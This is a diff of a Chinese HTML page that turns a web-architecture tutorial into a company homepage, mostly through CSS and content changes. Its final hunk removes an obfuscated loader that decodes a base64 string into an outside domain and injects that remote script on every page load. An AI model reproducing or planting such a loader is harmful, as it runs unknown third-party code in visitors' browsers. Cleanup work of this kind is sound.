@@ -3,85 +3,81 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>现代Web架构：模块化设计</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>未来之光科技 - 创新驱动，价值共创</title>
     <style>
+        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Arial', sans-serif;
+            /* 简洁的无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #F8F9FA;
-            /* 极浅灰色背景 */
-            color: #34495E;
-            /* 深灰蓝色文本 */
-            line-height: 1.7;
+            background-color: #fcfcfc;
+            /* 极浅的背景色 */
+            color: #333333;
+            /* 标准深色文本 */
+            line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
         }
 
+        /* 容器 */
         .container {
             max-width: 90%;
+            /* 适应移动端 */
             margin: 0 auto;
-            padding: 30px 0;
+            padding: 20px 0;
         }
 
+        /* 头部 - 简洁大气风格 */
         header {
-            background-color: #FFFFFF;
-            /* 纯白色头部背景 */
-            padding: 50px 20px;
+            background-color: #ffffff;
+            /* 白色背景 */
+            padding: 30px 20px;
             text-align: center;
-            border-bottom: 2px solid #E0E0E0;
-            /* 细底部边框 */
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
-            position: relative;
-            overflow: hidden;
-        }
-
-        header::before {
-            /* 顶部几何图案 */
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at top left, rgba(102, 187, 106, 0.05) 0%, transparent 20%),
-                radial-gradient(circle at bottom right, rgba(102, 187, 106, 0.05) 0%, transparent 20%);
-            background-size: 100px 100px;
-            z-index: 0;
+            border-bottom: 1px solid #eeeeee;
+            /* 细分隔线 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            /* 极轻微的阴影 */
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 3em;
-            color: #34495E;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            position: relative;
-            z-index: 1;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            /* 更现代的无衬线字体 */
+            font-size: 2.2em;
+            /* 适中标题 */
+            color: #2c3e50;
+            /* 深灰蓝色 */
+            letter-spacing: -0.5px;
+            /* 微调字母间距 */
         }
 
         header p {
-            font-size: 1.2em;
-            color: #78909C;
-            margin-top: 15px;
-            position: relative;
-            z-index: 1;
+            font-size: 1em;
+            color: #7f8c8d;
+            /* 柔和灰色 */
+            margin-top: 10px;
         }
 
+        /* 导航菜单 - 顶部固定，简洁下划线 */
         nav {
-            background-color: #FFFFFF;
+            background-color: #ffffff;
+            /* 白色背景 */
             text-align: center;
             padding: 15px 0;
-            margin-top: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            border-bottom: 1px solid #eeeeee;
+            /* 细分隔线 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            /* 极轻微的阴影 */
             position: sticky;
-            top: 20px;
+            /* 粘性定位 */
+            top: 0;
+            /* 粘在顶部 */
             z-index: 1000;
+            /* 确保在最上层 */
         }
 
         nav ul {
@@ -89,34 +85,38 @@
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: center;
+            justify-content: space-around;
             flex-wrap: wrap;
         }
 
         nav ul li {
-            margin: 0 18px;
+            margin: 0 10px;
         }
 
         nav ul li a {
-            color: #546E7A;
+            color: #555555;
             /* 默认文字颜色 */
             text-decoration: none;
-            padding: 10px 0;
+            padding: 8px 0;
             position: relative;
             display: inline-block;
-            font-weight: 600;
+            font-weight: 500;
+            /* 适中粗细 */
             font-size: 1em;
             transition: color 0.3s ease;
         }
 
         nav ul li a::after {
+            /* 强调色下划线 */
             content: '';
             position: absolute;
             width: 0;
-            height: 3px;
-            background-color: #66BB6A;
-            /* 强调色：亮绿色 */
-            bottom: -8px;
+            height: 2px;
+            /* 更细的下划线 */
+            background-color: #3498db;
+            /* 强调色：蓝色 */
+            bottom: -3px;
+            /* 靠近文字 */
             left: 50%;
             transform: translateX(-50%);
             transition: width 0.3s ease;
@@ -129,245 +129,213 @@
 
         nav ul li a:hover,
         nav ul li a:focus {
-            color: #66BB6A;
+            color: #3498db;
+            /* 强调色 */
         }
 
-        nav ul li a.active {
-            /* 激活状态样式 */
-            color: #66BB6A;
-        }
-
-        nav ul li a.active::after {
-            width: 100%;
-        }
-
+        /* 内容区 - 简洁的卡片与列表风格 */
         main {
-            padding-top: 30px;
-            display: grid;
-            /* 网格布局 */
-            grid-template-columns: 1fr;
-            /* 默认单列 */
-            gap: 30px;
-            /* 网格间距 */
-        }
-
-        @media (min-width: 768px) {
-            main {
-                grid-template-columns: 1fr 1fr;
-                /* 768px以上两列 */
-            }
-        }
-
-        @media (min-width: 1024px) {
-            main {
-                grid-template-columns: 1fr 1fr 1fr;
-                /* 1024px以上三列 */
-            }
+            padding-top: 20px;
         }
 
         section {
-            background-color: #FFFFFF;
-            padding: 35px;
-            border-radius: 10px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-            border-left: 5px solid #90A4AE;
-            /* 柔和的左侧边框 */
+            background-color: #ffffff;
+            margin-bottom: 25px;
+            padding: 25px;
+            border-radius: 8px;
+            /* 较小的圆角 */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            /* 柔和阴影 */
         }
 
         section h2 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2em;
-            color: #34495E;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-size: 1.6em;
+            color: #2c3e50;
             margin-top: 0;
-            margin-bottom: 20px;
-            border-bottom: 1px dashed #E0E0E0;
-            /* 虚线分隔 */
+            margin-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
+            /* 细分隔线 */
             padding-bottom: 10px;
         }
 
         section h3 {
-            font-size: 1.5em;
-            color: #66BB6A;
-            /* 强调色 */
-            margin-top: 25px;
+            font-size: 1.2em;
+            color: #34495e;
+            margin-top: 20px;
             margin-bottom: 10px;
         }
 
         section p {
-            font-size: 1.05em;
-            color: #546E7A;
-            margin-bottom: 20px;
+            font-size: 0.95em;
+            color: #555555;
+            margin-bottom: 15px;
         }
 
         section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 25px auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 2px solid #CFD8DC;
-            /* 柔和边框 */
+            margin: 15px auto;
+            border-radius: 6px;
+            /* 图片圆角 */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08);
         }
 
-        pre {
-            background-color: #263238;
-            /* 深炭灰色代码背景 */
-            color: #A2F2A2;
-            /* 亮绿色代码文本 */
-            padding: 20px;
-            border-radius: 8px;
-            overflow-x: auto;
-            font-family: 'Fira Code', monospace;
+        .service-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .service-list li {
+            background-color: #f9f9f9;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 4px solid #3498db;
+            /* 强调色左边框 */
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+
+        .service-list li:hover {
+            background-color: #f0f4f8;
+            /* 悬停背景色 */
+        }
+
+        .service-list li h3 {
+            margin-top: 0;
+            margin-bottom: 5px;
+            color: #3498db;
+            /* 强调色 */
+        }
+
+        .service-list li p {
+            margin-bottom: 0;
             font-size: 0.9em;
-            margin-bottom: 25px;
-            border: 1px solid #66BB6A;
-            /* 强调色边框 */
-            box-shadow: 0 0 10px rgba(102, 187, 106, 0.4);
         }
 
-        code {
-            font-family: 'Fira Code', monospace;
-            font-size: 0.9em;
-            color: #A2F2A2;
+        .contact-info p {
+            margin-bottom: 8px;
+            font-size: 0.95em;
         }
 
-        pre code {
-            color: #A2F2A2;
-        }
-
-        footer {
-            background-color: #34495E;
-            /* 深灰蓝色页脚背景 */
-            color: #F8F9FA;
-            padding: 40px 0;
-            text-align: center;
-            font-size: 0.9em;
-            margin-top: 50px;
-            border-top: 2px solid #66BB6A;
-            /* 强调色顶部边框 */
-            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        .footer-links a {
-            color: #F8F9FA;
+        .contact-info a {
+            color: #3498db;
             text-decoration: none;
-            margin: 0 18px;
-            font-size: 1.1em;
             transition: color 0.3s ease;
         }
 
-        .footer-links a:hover {
-            color: #66BB6A;
+        .contact-info a:hover {
+            color: #2980b9;
+        }
+
+        /* 页脚 - 极简风格 */
+        footer {
+            background-color: #ffffff;
+            /* 白色背景 */
+            padding: 20px 0;
+            text-align: center;
+            font-size: 0.85em;
+            color: #7f8c8d;
+            margin-top: 30px;
+            border-top: 1px solid #eeeeee;
+            /* 细分隔线 */
+            box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .social-links a {
+            color: #7f8c8d;
+            /* 社交链接颜色 */
+            text-decoration: none;
+            margin: 0 12px;
+            font-size: 1.1em;
+            /* 适中图标大小 */
+            transition: color 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: #3498db;
+            /* 强调色 */
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <header>
         <div class="container">
-            <h1>现代Web架构</h1>
-            <p>模块化设计与开发实践</p>
+            <h1>未来之光科技</h1>
+            <p>创新驱动，价值共创</p>
         </div>
     </header>
 
     <div class="container">
         <nav id="mainNav">
             <ul>
-                <li><a href="#introduction">引言</a></li>
-                <li><a href="#modules">模块化</a></li>
-                <li><a href="#patterns">设计模式</a></li>
-                <li><a href="#performance">性能优化</a></li>
+                <li><a href="#about-us">关于我们</a></li>
+                <li><a href="#our-expertise">核心专长</a></li>
+                <li><a href="#contact-us">联系方式</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="introduction">
-                <h2>引言：可伸缩架构</h2>
-                <img src="https://picsum.photos/300/200?random=1&tag=architecture-diagram-abc" alt="架构图"
-                    class="random-image">
-                <p>构建可伸缩、可维护的Web应用是现代开发的核心挑战。本指南将深入探讨模块化设计原则，帮助您构建健壮且适应未来需求的应用。</p>
-                <p>我们将从基础概念开始，逐步深入到高级设计模式和性能优化策略。</p>
+            <section id="about-us">
+                <h2>关于我们</h2>
+                <img src="https://picsum.photos/300/200?random=1" alt="公司团队" class="random-image">
+                <p>未来之光科技是一家专注于前沿技术研发与应用的高科技企业。我们致力于为客户提供创新、高效、可靠的数字化解决方案，助力企业实现业务增长与转型。</p>
+                <p>我们拥有一支充满活力和创造力的专业团队，秉持“以客户为中心”的理念，不断探索技术边界，为各行业带来突破性的产品和服务。</p>
             </section>
 
-            <section id="modules">
-                <h2>模块化：代码组织艺术</h2>
-                <img src="https://picsum.photos/300/200?random=2&tag=code-blocks-def" alt="代码块" class="random-image">
-                <p>模块化是管理复杂代码库的关键。通过将代码分解为独立的、可复用的模块，可以提高代码的可读性、可维护性和协作效率。</p>
-                <pre><code>// ES6 模块导出
-export const PI = 3.14159;
-
-export function add(a, b) {
-    return a + b;
-}
-
-// ES6 模块导入
-import { PI, add } from './math.js';
-console.log(add(PI, 5));</code></pre>
-                <p>模块化不仅限于JavaScript，也适用于CSS和HTML结构。</p>
+            <section id="our-expertise">
+                <h2>核心专长</h2>
+                <p>我们专注于以下领域，提供专业、定制化的服务：</p>
+                <ul class="service-list">
+                    <li>
+                        <h3>人工智能与机器学习</h3>
+                        <p>开发智能算法，提供数据分析、预测模型和自动化解决方案。</p>
+                    </li>
+                    <li>
+                        <h3>云计算与大数据</h3>
+                        <p>构建可扩展的云基础设施，处理和分析海量数据，提供数据驱动的洞察。</p>
+                    </li>
+                    <li>
+                        <h3>物联网 (IoT) 解决方案</h3>
+                        <p>设计和部署智能设备网络，实现设备互联、数据采集与远程控制。</p>
+                    </li>
+                    <li>
+                        <h3>区块链技术应用</h3>
+                        <p>探索区块链在数据安全、供应链管理和数字资产等领域的创新应用。</p>
+                    </li>
+                </ul>
+                <img src="https://picsum.photos/300/200?random=2" alt="技术专长" class="random-image">
             </section>
 
-            <section id="patterns">
-                <h2>设计模式：通用解决方案</h2>
-                <img src="https://picsum.photos/300/200?random=3&tag=design-patterns-ghi" alt="设计模式"
-                    class="random-image">
-                <p>设计模式是软件开发中常见问题的通用、可重用的解决方案。理解并应用这些模式可以帮助我们编写更优雅、更健壮的代码。</p>
-                <p>例如，观察者模式在事件驱动的系统中非常常见，而工厂模式则用于创建对象。</p>
-                <pre><code>// 简单的观察者模式示例
-class Subject {
-    constructor() {
-        this.observers = [];
-    }
-
-    addObserver(observer) {
-        this.observers.push(observer);
-    }
-
-    notify(data) {
-        this.observers.forEach(observer => observer.update(data));
-    }
-}
-
-class Observer {
-    constructor(name) {
-        this.name = name;
-    }
-
-    update(data) {
-        console.log(`${this.name} 收到更新: ${data}`);
-    }
-}
-
-const subject = new Subject();
-const obs1 = new Observer('观察者A');
-const obs2 = new Observer('观察者B');
-
-subject.addObserver(obs1);
-subject.addObserver(obs2);
-
-subject.notify('新消息到达！');</code></pre>
-            </section>
-
-            <section id="performance">
-                <h2>性能优化：提升用户体验</h2>
-                <img src="https://picsum.photos/300/200?random=4&tag=performance-speed-jkl" alt="性能速度"
-                    class="random-image">
-                <p>优化Web应用性能对于提升用户体验至关重要。这包括减少加载时间、提高响应速度和确保流畅的动画。</p>
-                <p>常见的优化技术包括代码分割、懒加载、图片优化和使用CDN等。</p>
+            <section id="contact-us">
+                <h2>联系方式</h2>
+                <p>欢迎与我们联系，共同探讨合作机会。</p>
+                <div class="contact-info">
+                    <p><strong>公司地址：</strong> 科技创新园B区501室</p>
+                    <p><strong>联系电话：</strong> <a href="tel:+861012345678">+86 10 1234 5678</a></p>
+                    <p><strong>电子邮箱：</strong> <a href="mailto:info@futurelight.com">info@futurelight.com</a></p>
+                    <p><strong>工作时间：</strong> 周一至周五 9:00 - 17:30</p>
+                    <p>
+                        <!-- 地图占位符 -->
+                        <img src="https://placehold.co/300x200/e0e0e0/555555?text=公司位置示意图" alt="公司位置示意图"
+                            class="random-image">
+                    </p>
+                </div>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 Web架构指南. 版权所有.</p>
-            <div class="footer-links">
-                <a href="#" target="_blank">资源</a> |
-                <a href="#" target="_blank">联系</a> |
-                <a href="#" target="_blank">关于</a>
+            <p>&copy; 2025 未来之光科技. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">微信</a> |
+                <a href="#" target="_blank">领英</a> |
+                <a href="#" target="_blank">官网</a>
             </div>
         </div>
     </footer>
@@ -385,45 +353,19 @@ subject.notify('新消息到达！');</code></pre>
         document.addEventListener('DOMContentLoaded', function () {
             document.querySelectorAll('nav a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
-                    e.preventDefault();
+                    e.preventDefault(); // 阻止默认跳转
 
                     const targetId = this.getAttribute('href').substring(1);
                     const targetElement = document.getElementById(targetId);
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20,
-                            behavior: 'smooth'
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth' // 平滑滚动
                         });
                     }
                 });
             });
-
-            const sections = document.querySelectorAll('main section');
-            const navLinks = document.querySelectorAll('nav ul li a');
-
-            function highlightNavLink() {
-                let currentSectionId = '';
-
-                sections.forEach(section => {
-                    const sectionTop = section.offsetTop - document.querySelector('nav').offsetHeight - 30;
-                    const sectionBottom = sectionTop + section.offsetHeight;
-
-                    if (window.pageYOffset >= sectionTop && window.pageYOffset < sectionBottom) {
-                        currentSectionId = section.id;
-                    }
-                });
-
-                navLinks.forEach(link => {
-                    link.classList.remove('active');
-                    if (link.getAttribute('href').substring(1) === currentSectionId) {
-                        link.classList.add('active');
-                    }
-                });
-            }
-
-            window.addEventListener('scroll', highlightNavLink);
-            highlightNavLink();
         });
     </script>
     <script>
@@ -431,53 +373,15 @@ subject.notify('新消息到达！');</code></pre>
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9vMXAzdTVpLnJvamRqbC5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
